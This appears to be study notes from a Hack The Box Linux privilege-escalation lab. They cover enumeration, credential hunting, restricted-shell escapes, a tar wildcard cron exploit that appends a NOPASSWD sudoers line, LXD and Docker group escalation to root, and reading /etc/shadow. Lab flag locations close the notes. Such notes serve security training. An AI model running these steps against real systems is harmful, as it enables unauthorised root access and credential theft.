# Basic Enumeration

List current processes

```shell-session
ps aux | grep root
```

```shell-session
ps au
```

Check home directory

```shell-session
ls /home
```

Check SSH directory

```shell-session
ls -l ~/.ssh
```

Check bash history

```shell-session
history
```

Check User's Privileges

```shell-session
sudo -l
```

Check .conf and .config files

Check passwords directories

```shell-session
cat /etc/passwd
```

```shell-session
cat /etc/shadow
```

Check Cron jobs

```shell-session
ls -la /etc/cron.daily/
```

We can confirm that a cron job is running using [pspy](https://github.com/DominicBreuker/pspy), a command-line tool used to view running processes without the need for root privileges. We can use it to see commands run by other users, cron jobs, etc. It works by scanning [procfs](https://en.wikipedia.org/wiki/Procfs).

Check file systems & additional drives, maybe you'll find something new

```shell-session
lsblk
```

Check SETUID and SETGID Permissions

Find writable directories

```shell-session
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```

Find writable files

```shell-session
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

# Environment Enumeration

OS Version

```shell-session
cat /etc/os-release
```

Kernel version

```shell-session
uname -a
cat /proc/version
```

User's PATH

```shell-session
echo $PATH
```

Check environmental variables

```shell-session
env
```

CPU

```shell-session
lscpu 
```

Login shells

```shell-session
cat /etc/shells
```

Check for drive credentials

```shell-session
cat /etc/fstab
```

Check routing table

```shell-session
netstat -rn
route
```

Check ARP table

```shell-session
arp -a
```

Existing groups

```shell-session
cat /etc/group
```

List group users

```shell-session
getent group <group>
```

Mounted file systems

```shell-session
df -h
```

Unmouted file systems

```shell-session
cat /etc/fstab | grep -v "#" | column -t
```

All hidden files

```shell-session
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null 
```

All hidden directories

```shell-session
find / -type d -name ".*" -ls 2>/dev/null
```

Temporary files

```shell-session
ls -l /tmp /var/tmp /dev/shm
```

# Linux Services & Internals Enumeration

Network interfaces

```shell-session
ip a
```

Hosts

```shell-session
cat /etc/hosts
```

User's last login

```shell-session
lastlog
```

Last logins

```shell
last
```

Logged in users

```shell-session
w
```

Find history files

```shell-session
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```

Proc

```shell-session
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
```

Installed packages

```shell-session
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
```

Sudo version

```shell-session
sudo -V
```

Binaries

```shell-session
ls -l /bin /usr/bin/ /usr/sbin/
```

GTFObins

```shell-session
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
```

Trace system calls

```shell-session
strace ping -c1 10.129.112.20
```

Configuration files

```shell-session
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```

Scripts

```shell-session
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```

# Credential hunting

Check /var for interesting stuff. This folder typically contains web root.

```shell-session
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
```

Check spool and mail folders. Usually located in /var

```shell-session
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

Check ssh folder

# Path abuse

[PATH](http://www.linfo.org/path_env_var.html) is an environment variable that specifies the set of directories where an executable can be located. An account's PATH variable is a set of absolute paths, allowing a user to type a command without specifying the absolute path to the binary.

```shell-session
echo $PATH
```

Adding `.` to a user's PATH adds their current working directory to the list. For example, if we can modify a user's path, we could replace a common binary such as `ls` with a malicious script such as a reverse shell. If we add `.` to the path by issuing the command `PATH=.:$PATH` and then `export PATH`, we will be able to run binaries located in our current working directory by just typing the name of the file (i.e. just typing `ls` will call the malicious script named `ls` in the current working directory instead of the binary located at `/bin/ls`).

```shell-session
PATH=.:${PATH}
export PATH
echo $PATH
```

# Wildcard abuse

A wildcard character can be used as a replacement for other characters and are interpreted by the shell before other actions. Examples of wild cards include:

| **Character** | **Significance**                                                                                                                                |
| ------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| `*`               | An asterisk that can match any number of characters in a file name.                                                                                   |
| `?`               | Matches a single character.                                                                                                                           |
| `[ ]`             | Brackets enclose characters and can match any single one at the defined position.                                                                     |
| `~`               | A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory. |
| `-`               | A hyphen within brackets will denote a range of characters.                                                                                           |

An example of how wildcards can be abused for privilege escalation is the `tar` command, a common program for creating/extracting archives. If we look at the [man page](http://man7.org/linux/man-pages/man1/tar.1.html) for the `tar` command, we see the following:

```shell-session
htb_student@NIX02:~$ man tar

<SNIP>
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.
```

The `--checkpoint-action` option permits an `EXEC` action to be executed when a checkpoint is reached (i.e., run an arbitrary operating system command once the tar command executes.) By creating files with these names, when the wildcard is specified, `--checkpoint=1` and `--checkpoint-action=exec=sh root.sh` is passed to `tar` as command-line options. Let's see this in practice.

Consider the following cron job, which is set up to back up the `/root` directory's contents and create a compressed archive in `/tmp`. The cron job is set to run every minute, so it is a good candidate for privilege escalation.

```shell-session
#
#
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

We can leverage the wild card in the cron job to write out the necessary commands as file names with the above in mind. When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify.

```shell-session
htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb-student@NIX02:~$ echo "" > --checkpoint=1
```

We can check and see that the necessary files were created.

```shell-session
htb-student@NIX02:~$ ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
```

Once the cron job runs again, we can check for the newly added sudo privileges and sudo to root directly.

```shell-session
htb-student@NIX02:~$ sudo -l

Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: ALL
```

# Escaping restricted shells

It is always a good idea to

```
ssh psj@server_name-t "bash --noprofile"
```

This bypasses loading the default config for the restricted shell.

Use

```
compgen -c
```

to see available commands.

#### Command injection

Imagine that we are in a restricted shell that allows us to execute commands by passing them as arguments to the `ls` command. Unfortunately, the shell only allows us to execute the `ls` command with a specific set of arguments, such as `ls -l` or `ls -a`, but it does not allow us to execute any other commands. In this situation, we can use command injection to escape from the shell by injecting additional commands into the argument of the `ls` command.

For example, we could use the following command to inject a `pwd` command into the argument of the `ls` command:

  **Command injection**

```shell-session
StavreAcad@htb[/htb]$ ls -l `pwd` 
```

This command would cause the `ls` command to be executed with the argument `-l`, followed by the output of the `pwd` command. Since the `pwd` command is not restricted by the shell, this would allow us to execute the `pwd` command and see the current working directory, even though the shell does not allow us to execute the `pwd` command directly.

#### Command Substitution

Another method for escaping from a restricted shell is to use command substitution. This involves using the shell's command substitution syntax to execute a command. For example, imagine the shell allows users to execute commands by enclosing them in backticks (`). In that case, it may be possible to escape from the shell by executing a command in a backtick substitution that is not restricted by the shell.

#### Command Chaining

In some cases, it may be possible to escape from a restricted shell by using command chaining. We would need to use multiple commands in a single command line, separated by a shell metacharacter, such as a semicolon (`;`) or a vertical bar (`|`), to execute a command. For example, if the shell allows users to execute commands separated by semicolons, it may be possible to escape from the shell by using a semicolon to separate two commands, one of which is not restricted by the shell.

#### Environment Variables

For escaping from a restricted shell to use environment variables involves modifying or creating environment variables that the shell uses to execute commands that are not restricted by the shell. For example, if the shell uses an environment variable to specify the directory in which commands are executed, it may be possible to escape from the shell by modifying the value of the environment variable to specify a different directory.

#### Shell Functions

In some cases, it may be possible to escape from a restricted shell by using shell functions. For this we can define and call shell functions that execute commands not restricted by the shell. Let us say, the shell allows users to define and call shell functions, it may be possible to escape from the shell by defining a shell function that executes a command.

# Permissions-based privilege escalation

## Special Permissions

---

The `Set User ID upon Execution` (`setuid`) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The `setuid` bit appears as an `s`.

```shell-session
StavreAcad@htb[/htb]$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

The Set-Group-ID (setgid) permission is another special permission that allows us to run binaries as if we were part of the group that created them. These files can be enumerated using the following command: `find / -uid 0 -perm -6000 -type f 2>/dev/null`. These files can be leveraged in the same manner as `setuid` binaries to escalate privileges.

```shell-session
StavreAcad@htb[/htb]$ find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

Check here how to set special permissions https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits

## Privileged Groups

### LXD

LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at `/mnt/root`

Unzip the Alpine image.

```shell-session
devops@NIX02:~$ unzip alpine.zip 
```

Start the LXD initialization process. Choose the defaults for each prompt. Consult this [post](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) for more information on each step.

```shell-session
devops@NIX02:~$ lxd init

Do you want to configure a new storage pool (yes/no) [default=yes]? yes
Name of the storage backend to use (dir or zfs) [default=dir]: dir
Would you like LXD to be available over the network (yes/no) [default=no]? no
Do you want to configure the LXD bridge (yes/no) [default=yes]? yes
```

Import the local image.

```shell-session
devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04
```

Start a privileged container with the `security.privileged` set to `true` to run the container without a UID mapping, making the root user in the container the same as the root user on the host.

```shell-session
devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true

Creating r00t
```

Mount the host file system.

```shell-session
devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

Device mydev added to r00t
```

Finally, spawn a shell inside the container instance. We can now browse the mounted host file system as root. For example, to access the contents of the root directory on the host type `cd /mnt/root/root`. From here we can read sensitive files such as `/etc/shadow` and obtain password hashes or gain access to SSH keys in order to connect to the host system as root, and more.

```shell-session
devops@NIX02:~$ lxc start r00t
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)
~ #
```

### Docker

Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command `docker run -v /root:/mnt -it ubuntu`.
This command create a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse to the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as `/etc` which could be used to retrieve the contents of the `/etc/shadow` file for offline password cracking or adding a privileged user.

---

### Disk

Users within the disk group have full access to any devices contained within `/dev`, such as `/dev/sda1`, which is typically the main device used by the operating system. An attacker with these privileges can use `debugfs` to access the entire file system with root level privileges. As withthe Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user.

---

### ADM

Members of the adm group are able to read all logs stored in `/var/log`. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.

## Capabilities

Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted.
This allows for more fine-grained control over which processes have access to certain privileges, making it more secure than the traditional Unix model of granting privileges to users and groups.

Setting capabilities involves using the appropriate tools and commands to assign specific capabilities to executables or programs. In Ubuntu, for example, we can use the `setcap` command to set capabilities for specific executables. This command allows us to specify the capability we want to set and the value we want to assign.

For example, we could use the following command to set the `cap_net_bind_service` capability for an executable:

```shell-session
StavreAcad@htb[/htb]$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

| **Capability**                                                   | **Description**                                                                                                 |
| ---------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- |
| `cap_sys_admin`                                                      | Allows to perform actions with administrative privileges, such as modifying system files or changing system settings. |
| `cap_sys_chroot`                                                     | Allows to change the root directory for the current process,                                                          |
| allowing it to access files and directories that would otherwise be    |                                                                                                                       |
| inaccessible.                                                          |                                                                                                                       |
| `cap_sys_ptrace`                                                     | Allows to attach to and debug other processes, potentially allowing                                                   |
| it to gain access to sensitive information or modify the behavior of   |                                                                                                                       |
| other processes.                                                       |                                                                                                                       |
| `cap_sys_nice`                                                       | Allows to raise or lower the priority of processes, potentially                                                       |
| allowing it to gain access to resources that would otherwise be        |                                                                                                                       |
| restricted.                                                            |                                                                                                                       |
| `cap_sys_time`                                                       | Allows to modify the system clock, potentially allowing it to                                                         |
| manipulate timestamps or cause other processes to behave in unexpected |                                                                                                                       |
| ways.                                                                  |                                                                                                                       |
| `cap_sys_resource`                                                   | Allows to modify system resource limits, such as the maximum number                                                   |
| of open file descriptors or the maximum amount of memory that can be   |                                                                                                                       |
| allocated.                                                             |                                                                                                                       |
| `cap_sys_module`                                                     | Allows to load and unload kernel modules, potentially allowing it to                                                  |
| modify the operating system's behavior or gain access to sensitive     |                                                                                                                       |
| information.                                                           |                                                                                                                       |
| `cap_net_bind_service`                                               | Allows to bind to network ports, potentially allowing it to gain                                                      |
| access to sensitive information or perform unauthorized actions.       |                                                                                                                       |

When a binary is executed with capabilities, it can perform the actions that the capabilities allow. However, it will not be able to perform any actions not allowed by the capabilities. This allows for more fine-grained control over the binary's privileges and can help prevent security vulnerabilities and unauthorized access to sensitive
information.

When using the `setcap` command to set capabilities for an executable in Linux, we need to specify the capability we want to set and the value we want to assign. The values we use will depend on the specific capability we are setting and the privileges we want to grant to the executable.

Here are some examples of values that we can use with the `setcap` command, along with a brief description of what they do:

| **Capability Values**                                              | **Description**                                            |
| ------------------------------------------------------------------------ | ---------------------------------------------------------------- |
| `=`                                                                    | This value sets the specified capability for the executable, but |
| does not grant any privileges. This can be useful if we want to clear a  |                                                                  |
| previously set capability for the executable.                            |                                                                  |
| `+ep`                                                                  | This value grants the effective and permitted privileges for the |
| specified capability to the executable. This allows the executable to    |                                                                  |
| perform the actions that the capability allows but does not allow it to  |                                                                  |
| perform any actions that are not allowed by the capability.              |                                                                  |
| `+ei`                                                                  | This value grants sufficient and inheritable privileges for the  |
| specified capability to the executable. This allows the executable to    |                                                                  |
| perform the actions that the capability allows and child processes       |                                                                  |
| spawned by the executable to inherit the capability and perform the same |                                                                  |
| actions.                                                                 |                                                                  |
| `+p`                                                                   | This value grants the permitted privileges for the specified     |
| capability to the executable. This allows the executable to perform the  |                                                                  |
| actions that the capability allows but does not allow it to perform any  |                                                                  |
| actions that are not allowed by the capability. This can be useful if we |                                                                  |
| want to grant the capability to the executable but prevent it from       |                                                                  |
| inheriting the capability or allowing child processes to inherit it.     |                                                                  |

Several Linux capabilities can be used to escalate a user's privileges to `root`, including:

| **Capability**                                                                                                                                     | **Desciption**                                                                                                                 |
| -------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| `cap_setuid`                                                                                                                                           | Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root`user. |
| `cap_setgid`                                                                                                                                           | Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root`group.        |
| `cap_sys_admin`                                                                                                                                        | This capability provides a broad range of administrative privileges,                                                                 |
| including the ability to perform many actions reserved for the `root`user, such as modifying system settings and mounting and unmounting file systems. |                                                                                                                                      |
| `cap_dac_override`                                                                                                                                     | Allows bypassing of file read, write, and execute permission checks.                                                                 |

Enumerating Capabilities

```shell-session
StavreAcad@htb[/htb]$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

# Misc

https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells?slide=8

https://gist.github.com/PSJoshi/04c0e239ac7b486efb3420db4086e290

> echo $(<flag.txt)

The `<` symbol will read the contents of the file `flag.txt`.

The `$(...)` syntax essentially says to substitute the content of the file (that was read by `<`) into the command.

The `echo` command will then do what it’s told and echo back the contents of the file instead of the name of the file.

flag3.txt /var/log

in bin found '['

./home/htb-student/.config/.flag1.txt
./home/barry/flag2.txt
./var/log/flag3.txt
./var/lib/tomcat9/flag4.txt
